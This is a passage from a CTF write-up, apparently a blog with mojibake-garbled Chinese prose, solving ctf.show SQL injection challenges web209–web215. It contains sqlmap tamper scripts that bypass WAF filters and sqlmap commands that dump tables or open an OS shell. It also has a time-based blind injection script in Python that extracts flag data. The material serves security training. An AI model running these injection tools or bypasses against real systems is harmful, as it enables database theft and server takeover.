</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">firstspace</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">                <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isspace</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">                    <span class="n">firstspace</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">                    <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">                    <span class="k">continue</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">                <span class="n">quote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">quote</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">                <span class="n">doublequote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">doublequote</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;*&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">                <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">
</span></span><span class="line"><span class="ln">40</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;=&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">                <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;like&#39;</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">
</span></span><span class="line"><span class="ln">44</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34; &#34;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">                <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">
</span></span><span class="line"><span class="ln">48</span><span class="cl">            <span class="n">retVal</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">
</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="k">return</span> <span class="n">retVal</span>
</span></span></code></pre></div><p>å…¶å®ä¹Ÿä¸ç”¨å†™è¿™ä¹ˆå¤æ‚</p>
<p>ç›´æ¥è¿™æ ·ä¹Ÿokçš„</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">NORMAL</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">return</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="p">,</span> <span class="s2">&#34; like &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x09</span><span class="p">))</span>
</span></span></code></pre></div><p>payload:</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=3oemcboib377tes0fi7ltgh9ba;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web209 -T ctfshow_flav --dump
</code></pre><h4 id="web210">web210<a hidden class="anchor" aria-hidden="true" href="#web210">#</a></h4>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
$sql = &#34;select id,username,pass from ctfshow_user where id = &#39;&#34;.$id.&#34;&#39; limit 0,1;&#34;;
      
è¿”å›é€»è¾‘

//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
      
</code></pre><p>è¿™é¢˜ä¼šå¯¹æŸ¥è¯¢çš„å­—ç¬¦è¿›è¡Œä¸¤æ¬¡çš„base64è§£å¯†å’Œä¸¤æ¬¡çš„åè½¬</p>
<p>é‚£æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹tamperï¼Œä½¿ä¼ å…¥çš„payloadè¿›è¡Œä¸¤æ¬¡base64åŠ å¯†å³å¯</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">NORMAL</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">rev1</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">encode1</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">rev1</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="n">rev2</span> <span class="o">=</span> <span class="n">encode1</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="n">encode2</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">rev2</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">return</span> <span class="n">encode2</span>
</span></span></code></pre></div><p>payload:</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=bffum6tr2u1k3h8l9bgtkst4ni;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web210 -T ctfshow_flavi --dump
</code></pre><h4 id="web211">web211<a hidden class="anchor" aria-hidden="true" href="#web211">#</a></h4>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
$sql = &#34;select id,username,pass from ctfshow_user where id = &#39;&#34;.$id.&#34;&#39; limit 0,1;&#34;;
      
è¿”å›é€»è¾‘

//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
function waf($str){
    return preg_match(&#39;/ /&#39;, $str);
}
</code></pre><p>å¢åŠ äº†ç©ºæ ¼waf</p>
<p>é—®é¢˜ä¸å¤§</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">NORMAL</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">	
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">payload0</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x09</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="n">rev1</span> <span class="o">=</span> <span class="n">payload0</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="n">encode1</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">rev1</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="n">rev2</span> <span class="o">=</span> <span class="n">encode1</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="n">encode2</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">rev2</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">return</span> <span class="n">encode2</span>
</span></span></code></pre></div><p>payload</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=ibn3o3imhq85l1043f80nbdova;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web211 -T ctfshow_flavia --dump
</code></pre><h4 id="web212">web212<a hidden class="anchor" aria-hidden="true" href="#web212">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="n">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="o">//</span><span class="n">æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="err">$</span><span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="err">$</span><span class="nb">id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 0,1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="o">//</span><span class="n">å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="n">function</span> <span class="n">decode</span><span class="p">(</span><span class="err">$</span><span class="nb">id</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">return</span> <span class="n">strrev</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="n">strrev</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="err">$</span><span class="nb">id</span><span class="p">))));</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">function</span> <span class="n">waf</span><span class="p">(</span><span class="err">$</span><span class="nb">str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">return</span> <span class="n">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*/&#39;</span><span class="p">,</span> <span class="err">$</span><span class="nb">str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>wafå¢åŠ äº†*</p>
<p>ä½†æ˜¯ä¸å½±å“ä¸Šä¸€é¢˜çš„tamper</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=72duisds4cprdqlbtf4fu4389d;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web211 -T ctfshow_flavis --dump
</code></pre><h4 id="web213">web213<a hidden class="anchor" aria-hidden="true" href="#web213">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 0,1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1">//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">function</span> <span class="nf">decode</span><span class="p">(</span><span class="nv">$id</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">return</span> <span class="nx">strrev</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$id</span><span class="p">))));</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*/&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>æ ¹æ®æç¤ºï¼Œç”¨&ndash;os-shellæ‹¿åˆ°shellè¯»flag</p>
<p>å…¶ä»–è·Ÿä¸Šé¢˜ä¸€æ ·</p>
<p>payload:</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=66ddslui3ejn3b4pa6437qm60j;&#34; --referer=ctf.show --safe-url=&#34;http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web211 --os-shell
</code></pre><p><img alt="image-20250213223852147" loading="lazy" src="./assets/image-20250213223852147.png"></p>
<h4 id="æ—¶é—´ç›²æ³¨">æ—¶é—´ç›²æ³¨<a hidden class="anchor" aria-hidden="true" href="#æ—¶é—´ç›²æ³¨">#</a></h4>
<h4 id="web214">web214<a hidden class="anchor" aria-hidden="true" href="#web214">#</a></h4>
<p><img alt="image-20250214112011874" loading="lazy" src="./assets/image-20250214112011874.png"></p>
<p>è¿™é“é¢˜æ²¡ç»™å‡ºæ³¨å…¥ç‚¹</p>
<p><img alt="image-20250214114945157" loading="lazy" src="./assets/image-20250214114945157.png"></p>
<p>ä¸»é¡µæ‰¾åˆ°select.jsä¸­ï¼Œæµ‹è¯•åå‘ç°ipä¸ºæ³¨å…¥ç‚¹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://fe78d582-57da-4291-845f-1e8ff2936104.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="c1"># ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="c1"># æŸ¥è¡¨å</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># æŸ¥åˆ—å</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagx&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># çˆ†å­—æ®µ</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flaga from ctfshow_flagx&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,sleep(1),1)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="c1"># å‘é€POSTè¯·æ±‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ä¸º1ç§’</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="c1"># å¦‚æœè¯·æ±‚åœ¨1ç§’å†…è¿”å›ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å°äºç­‰äºä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="c1"># å¦‚æœè¯·æ±‚è¶…æ—¶ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å¤§äºä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web215">web215<a hidden class="anchor" aria-hidden="true" href="#web215">#</a></h4>
<p><img alt="image-20250214121007384" loading="lazy" src="./assets/image-20250214121007384.png"></p>
<p>ä¸Šé¢˜è„šæœ¬æ”¹ä¸€æ”¹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://08e16d35-1a8c-4ed7-9e9e-760a32aa0756.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
